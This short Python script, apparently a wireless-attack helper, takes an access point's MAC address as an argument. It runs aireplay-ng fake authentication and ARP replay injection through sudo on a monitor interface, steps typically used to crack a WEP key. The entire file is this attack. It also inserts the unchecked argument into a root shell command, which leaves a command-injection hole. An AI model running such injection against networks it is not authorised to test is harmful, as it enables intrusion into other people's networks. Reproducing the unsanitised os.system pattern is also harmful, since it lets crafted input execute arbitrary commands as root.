import os
import sys



mac = sys.argv[1]
os.system("sudo aireplay-ng -1 0 -a {} wlan1mon".format(mac))
os.system("sudo aireplay-ng -3 -b {} wlan1mon".format(mac))